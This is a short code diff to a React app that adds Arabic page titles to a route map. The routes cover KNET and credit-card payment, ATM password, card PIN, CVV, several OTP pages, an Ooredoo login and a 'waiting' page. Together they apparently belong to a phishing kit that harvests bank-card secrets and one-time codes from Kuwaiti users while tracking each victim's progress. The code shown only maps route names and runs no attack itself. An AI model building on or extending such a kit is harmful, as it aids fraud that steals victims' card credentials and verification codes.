@@ -97,15 +97,22 @@ function App() {
 
   useEffect(() => {
     const pageNameMap: Record<string, string> = {
+      '/': 'الصفحة الرئيسية',
+      '/register': 'تسجيل حساب - نوع الحساب',
+      '/register/personal-info': 'تسجيل حساب - البيانات الشخصية',
+      '/register/password': 'تسجيل حساب - كلمة المرور',
+      '/register/complete': 'تسجيل حساب - ربط الحساب',
+      '/mobile-verification': 'توثيق رقم الهاتف',
+      '/knet-payment': 'دفع KNET',
+      '/credit-card-payment': 'الدفع ببطاقة الائتمان',
+      '/atm-password': 'كلمة مرور ATM',
       '/ooredoo-login': 'تسجيل دخول Ooredoo',
       '/ooredoo-otp': 'رمز OTP Ooredoo',
-      '/credit-card-payment': 'الدفع ببطاقة الائتمان',
       '/otp-verification': 'رمز التحقق OTP',
-      '/atm-password': 'كلمة مرور ATM',
       '/card-otp': 'Card OTP',
       '/card-pin': 'Card PIN',
-      '/knet-payment': 'KNET',
       '/cvv': 'CVV',
+      '/waiting': 'صفحة الانتظار',
       '/final-page': 'الصفحة النهائية',
     };
     const path = location.split('?')[0];
